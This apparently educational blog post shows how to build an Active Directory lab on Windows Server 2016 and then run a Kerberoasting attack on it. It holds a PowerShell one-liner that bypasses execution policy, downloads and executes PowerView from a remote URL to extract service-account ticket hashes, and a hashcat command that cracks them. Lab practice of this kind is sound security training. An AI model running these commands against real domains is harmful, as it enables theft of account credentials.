---
layout: post
title: Setting up an Active Directory Lab for Red Teaming
date: 2019-12-16
summary: Beginners guide to setup AD & perform Kerberoasting 
categories: uncategorized
tags: [Red Teaming, Active Directory]
---

<p align="center">
  <img src="/images/activedirectory/activedirectory.png">
</p>

Hello Everyone , this blog is just a __noob__ guide to set up a active directory lab and then to perform a kerberos roasting attack on it from the attacker point of view.

<p align="center">
  <img src="https://media.giphy.com/media/L2NbIO4qK912E/source.gif">
</p>

__Things to Know before getting into it?__

1.What is Active Directory ?

Active Directory is a Microsoft Technology that has been used to manage network services & computers and other devices on a network. It is a primary feature of Windows Server, an operating system that runs both local and Internet-based servers.

__Requirements for Setting Up__

- 180 days trial of Windows Server 2016 which can be downloaded here: <https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2016>
- Windows 7 virtual box image which can be downloaded here: <https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/>
- Virtual box: <https://www.virtualbox.org/wiki/Downloads>
- Vmware Workstation: <https://www.vmware.com/in/products/workstation-player/workstation-player-evaluation.html>

<p align="center"><strong>Installing a Windows 2016 Server in Vmware Workstation</strong></p>

**Step 1 :** Open the Vmware Application and Click on Create a New Virtual Machine

<p align="center">
  <img src="/images/activedirectory/vm1.png">
</p>

**Step 2 :** Choose i will install Operating System and proceed further.

<p align="center">
  <img src="/images/activedirectory/vm2.png">
</p>

**Step 3 :** Choose the Operating System and Version of it.

<p align="center">
  <img src="/images/activedirectory/vm3.png">
</p>

**Step 4 :** Give the name for the Machine.

<p align="center">
  <img src="/images/activedirectory/vm4.png">
</p>

**Step 5 :** Choose the size and Split the data disk into Multiple files.

<p align="center">
  <img src="/images/activedirectory/vm5.png">
</p>

**Step 6 :** Click on Finish Button.

<p align="center">
  <img src="/images/activedirectory/vm6.png">
</p>

**Step 7 :** Go to the Virtual Machine setting on choose the ISO of the Operating System Windows Server 2016, that we are going to Install.

<p align="center">
  <img src="/images/activedirectory/vm7.png">
</p>

**Step 8 :** Change the Network Adapter setting to Bridged Network & replicate physical network connection .

<p align="center">
  <img src="/images/activedirectory/vm8.png">
</p>

**Step 9 :** Save all the changes and Turn On the Virtual Box,

<p align="center">
  <img src="/images/activedirectory/vm9.png">
</p>

**Step 10 :** Click on install button to start the Installation.

**Step 11 :** Choose the second option Standard Evaluation(Desktop Experience) and proceed further.

<p align="center">
  <img src="/images/activedirectory/vm10.png">
</p>

**Step 12 :** Choose custom Install Windows Only (advance) option and click on next button.

<p align="center">
  <img src="/images/activedirectory/vm11.png">
</p>

**Step 13 :** Choose the unallocated space and click on next button the Installation will be started.

<p align="center">
  <img src="/images/activedirectory/vm12.png">
</p>

**Step 14 :** After Successful installation , the Virtual Box will ask for Customize Setting the password for the Administrator user.

<p align="center">
  <img src="/images/activedirectory/vm13.png">
</p>

**Step 15 :** Then Click on the Vmware tools on the VMware menu, and start installing it for the Optimization of the Guest Operating System Performance.

<p align="center">
  <img src="/images/activedirectory/vm14.png">
</p>

**Step 16 :** Navigate to the File Explorer for the setup installation.

<p align="center">
  <img src="/images/activedirectory/vm15.png">
</p>

**Step 17 :** After successful installation , restart the virtual box.

<p align="center">
  <img src="/images/activedirectory/vm16.png">
</p>

<p align="center"><strong>Building an Active Directory using Powershell</strong></p>

Open the Power shell with Run as Administrator.

NOTE : To know about the Power Shell Version , use the following commands.

```powershell
$PSVersionTable.PSVersion
```
<p align="center">
  <img src="/images/activedirectory/power1.png">
</p>

```powershell
Get-Host
```
<p align="center">
  <img src="/images/activedirectory/power2.png">
</p>

<p align="center"><strong>Installing an Active Directory using Power Shell</strong></p>


**Step 1** : Type the following command to start the installation process.

```powershell
Install-windowsfeature AD-domain-services
```

<p align="center">
  <img src="/images/activedirectory/power3.png">
</p>

**Step 2** : To import the AD Command module type the below command.

<p align="center">
  <img src="/images/activedirectory/power4.png">
</p>

**Step 3** : This one liner PS command to finalize the AD installtion

```powershell
Install-ADDSForest -CreateDnsDelegation:$false ` -DatabasePath "C:\Windows\NTDS" ` -DomainMode "Win2012R2" ` -DomainName "server1.testlab.local" ` -DomainNetbiosName "server1" `  -ForestMode "Win2012R2" `  -InstallDns:$true `  -LogPath "C:\Windows\NTDS" `  -NoRebootOnCompletion:$false `  -SysvolPath "C:\Windows\SYSVOL" `  -Force:$true
```

The above One line command will install the AD as the first Domain Controller in a new forest.

NOTE : It will name the name as server1.testlab.local , through out the blog.

<p align="center">
  <img src="/images/activedirectory/power5.png">
</p>

After successful installation , it will restart automatically.

**Step 4** : To install the Remote Server Administration Tools Pack, type the below command.

```powershell
Install-WindowsFeature RSAT-ADDS
```

<p align="center">
  <img src="/images/activedirectory/power6.png">
</p>

**Step 5** : To Add the users to the Domain , type the below command.

```powershell
net user user1 Passw0rd! /ADD /DOMAIN
```

<p align="center">
  <img src="/images/activedirectory/power7.png">
</p>

**Step 6** : And also add that user to the Domain administrative group.

```powershell
net group “Domain Admins” user1 /add
```

<p align="center">
  <img src="/images/activedirectory/power8.png">
</p>

**Step 7** : To Verify that the user has been added successfully , type the following command.

```powershell
net users /domain
```

<p align="center">
  <img src="/images/activedirectory/power9.png">
</p>

**Step 8** : To Verify that the user has been added successfully to the Domain Administrative group, type the following command.

```powershell
net group /domain "Domain Admins"
```

<p align="center">
  <img src="/images/activedirectory/power10.png">
</p>

<p align="center"><strong>Introducing an Attacker</strong></p>

<p align="center">
  <img src="https://media.giphy.com/media/115BJle6N2Av0A/giphy.gif">
</p>


**Step 1** : Download the Windows 7 VM from the <https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/ and then start importing it into the Virtual Box.>

<p align="center">
  <img src="/images/activedirectory/window1.png">
</p>

**Step 2** : Navigate to the Network and Sharing Center.

<p align="center">
  <img src="/images/activedirectory/window2.png">
</p>

**Step 3** : Choose the change adapter setting option.

<p align="center">
  <img src="/images/activedirectory/window3.png">
</p>

**Step 4** : Right Click on the Network Adapter and Choose the Properties option.

<p align="center">
  <img src="/images/activedirectory/window4.png">
</p>

**Step 5** : Configure the DNS according to your Windows Server 2016 machine.

<p align="center">
  <img src="/images/activedirectory/window5.png">
</p>

**Step 6** : Disable the Network Adapter.

<p align="center">
  <img src="/images/activedirectory/window6.png">
</p>

**Step 7** : Enable the Network Adapter .

<p align="center">
  <img src="/images/activedirectory/window7.png">
</p>

**Step 8** : Navigate to  My Computer, right click on it and choose Properties Option.

<p align="center">
  <img src="/images/activedirectory/window8.png">
</p>

**Step 9** : Click on Change setting button.

<p align="center">
  <img src="/images/activedirectory/window9.png">
</p>

**Step 10** : Specify the Domain name by clicking on the radio button option .

<p align="center">
  <img src="/images/activedirectory/window10.png">
</p>

**Step 11** : If it is able to reach the Domain , it will ask you to Enter the username and password for the User (Don’t enter the DC username and password).

<p align="center">
  <img src="/images/activedirectory/window11.png">
</p>

**Step 12** : It will show a Successful message, if it is correct username.

<p align="center">
  <img src="/images/activedirectory/window12.png">
</p>

**Step 13** : Restart the machine to see the Domain Changes.

<p align="center">
  <img src="/images/activedirectory/window13.png">
</p>

**Step 14** : You can see there is domain name below the password . which shows the user has been added successfully .

<p align="center">
  <img src="/images/activedirectory/window14.png">
</p>


2.What is Kerberoasting ?

__Kerberoasting__ is an attack method that allows an attacker to __crack the passwords__ of service accounts in Active Directory offline and without fear of detection.

**Step 1**: Let’s create a Vulnerable service for one of the user, type the following command .

```powershell
setspn -s http/server1.testlab.local:80 user1
```
<p align="center">
  <img src="/images/activedirectory/kerb1.png">
</p>

**Step 2** : Now , here comes the one line PS command which will perform the Kerberoasting.

```powershell
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/nettitude/PoshC2/master/Modules/powerview.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash1.txt"
```

<p align="center">
  <img src="/images/activedirectory/kerb2.png">
</p>

**Step 3** : Now we have got the Hash that will  be saved in a text file.

<p align="center">
  <img src="https://media.giphy.com/media/102h4wsmCG2s12/giphy.gif">
</p>

<p align="center">
  <img src="/images/activedirectory/kerb3.png">
</p>

**Step 4** - Any domain user has the rights by default on a standard domain to request a copy of the service accounts and there correlating password hash.

<p align="center"><strong>Decrypt the Hash using Hashcat</strong></p>

**Step 1** - Now we have to decrypt the hash and get the password of the user, with the help of hashcat we can crack the hash using the following command.

```bash
hashcat -m 13100 kerb-Hash1.txt /usr/share/wordlists/rockyou.txt --force
```

<p align="center">
  <img src="/images/activedirectory/hash1.png">
</p>

**Step 2** - It will take few minutes to decrypt the hash, Once the hash is decrypted you will get the password.

<p align="center">
  <img src="/images/activedirectory/hash2.png">
</p>

<p align="center">
  <img src="https://media.giphy.com/media/26n7b76oYbyml60zC/giphy.gif">
</p>

Thanks for Reading !!!
